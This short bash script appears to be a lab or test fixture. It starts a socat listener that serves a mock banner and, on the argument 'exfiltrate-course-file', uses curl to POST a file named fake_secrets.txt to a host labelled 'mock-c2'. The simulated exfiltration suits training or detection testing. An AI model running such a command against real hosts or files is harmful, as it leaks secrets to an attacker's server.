#!/bin/bash

# Run harmless listener on TCP 9009 inside agent-node using socat
socat TCP4-LISTEN:9009,reuseaddr,fork SYSTEM:'echo "Mock Skill Banner"' &

if [ "$1" = "exfiltrate-course-file" ]; then
    # Make an HTTP POST request to the destination mock-c2
    curl -X POST --data-binary @fake_secrets.txt http://172.30.0.66:8080/
fi
